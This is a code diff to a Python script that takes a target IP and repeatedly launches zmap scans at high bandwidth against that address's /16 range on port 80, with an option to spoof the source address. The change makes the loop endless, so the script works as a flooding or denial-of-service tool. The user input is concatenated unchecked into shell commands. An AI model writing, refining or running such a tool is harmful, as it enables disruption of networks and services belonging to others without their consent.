@@ -2,7 +2,6 @@ import os
 import time
 import random
 
-i = 1
 
 ip = "0.0.0.0"
 spoof = ""
@@ -34,12 +33,12 @@ print(" ")
 ip = input("Target ip: ")
 
 if spoof == "":
- while i <= 2:
+ while 1:
   os.system("zmap -i "+ extension +" -B 10G -p 80 -T 10 -P 10 "+ ip +"/16")
   time.sleep(5)
 
 else:
- while i <= 2:
+ while 1:
   os.system("zmap -i "+ extension +" -S "+ spoof +" -B 10G -p 80 -T 10 -P 10 "+ ip +"/16")
   time.sleep(5)
 
